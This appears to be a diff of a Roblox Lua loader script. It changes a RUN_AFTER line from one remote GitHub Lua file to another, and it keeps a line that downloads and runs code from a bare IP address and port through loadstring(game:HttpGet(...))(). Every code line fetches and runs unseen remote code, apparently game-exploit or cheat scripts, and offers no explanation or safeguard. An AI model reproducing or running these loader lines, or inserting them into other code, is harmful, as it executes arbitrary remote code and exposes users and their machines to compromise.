@@ -1,4 +1,4 @@
 ID="4c78314a-bc55-43c0-9947-1c9db37afdab"
-RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/r4mpage4/r4mpageADM/refs/heads/main/saintcandyfarm.lua"))()
+RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/r4mpage4/r4mpageADM/refs/heads/main/r4mpageadmREAL.lua"))()
 
 loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjRjNzgzMTRhLWJjNTUtNDNjMC05OTQ3LTFjOWRiMzdhZmRhYiIsImtpbmQiOiJsb2FkZXIifQ"))()
